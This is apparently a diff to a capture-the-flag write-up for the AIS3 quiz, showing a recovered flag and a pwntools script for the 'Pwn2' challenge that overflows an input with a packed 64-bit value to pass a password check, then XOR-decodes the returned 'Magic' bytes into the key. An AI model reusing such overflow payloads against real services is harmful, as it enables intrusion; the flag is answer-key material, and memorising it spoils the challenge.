@@ -106,25 +106,27 @@ ais3{4nn0y1n9_Wh1t3_SpAcE_CHAR4CTERS}
 ### Pwn2
 ```python
 from pwn import *
-
 r = remote('quiz.ais3.org', '56746')
 
 ac = '77777777777777777777' + p64(77777777777777777)
-pw = '77777777777777777'
+pw = 77777777777777777
 
 print ac
 print pw
 
 r.sendline(ac)
-r.sendline(pw)
+r.sendline(str(pw))
 
 r.recvuntil('Your choice :')
 r.sendline('1')
-m = r.recvuntil('Magic : ')
-print int(m, 16)
-# m xor pw is the answer
-#key = int(m) ^ int(pw)
-#print key
+r.recvuntil('Magic :')
+m = r.recvrepeat(5)
+print 'magic =', repr(m)
+key = ''
+for c in m:
+    key += chr(ord(c) ^ int(hex(pw)[-2:], 16))
+print key
+
 r.interactive()
 ```
 ```
